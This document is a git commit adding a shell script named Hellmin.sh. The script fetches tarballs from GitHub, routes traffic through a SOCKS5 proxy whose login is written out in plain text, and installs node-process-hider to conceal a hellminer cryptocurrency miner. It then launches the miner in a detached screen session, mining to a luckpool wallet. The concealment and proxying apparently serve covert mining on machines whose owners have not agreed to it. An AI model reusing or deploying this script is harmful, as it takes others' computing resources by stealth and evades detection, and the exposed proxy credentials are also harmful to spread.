9b6a4a7a8a837d3dbfd49004a21fde5f7439c1f9
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-02-13 22:47:30 +0700

    Create Hellmin.sh

---
+++ Hellmin.sh
@@ -0,0 +1,50 @@
+nohup apt update && nohup apt -y install nohup sudo wget curl unzip
+nohup sudo apt-get install screen -y
+
+nohup sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+nohup curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+nohup apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+nohup wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = 209.127.191.180:9279
+
+socks5_username = hzfwtxrm
+
+socks5_password = 6i4c5so4h0ic
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp nohup wget https://github.com/Asriytdx/kurama/raw/main/gedang.tar.gz
+tar xf gedang.tar.gz
+chmod +x hellminer
+
+ph add hellminer
+
+screen -d -m ./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.SRUPUTT -p x --cpu 39
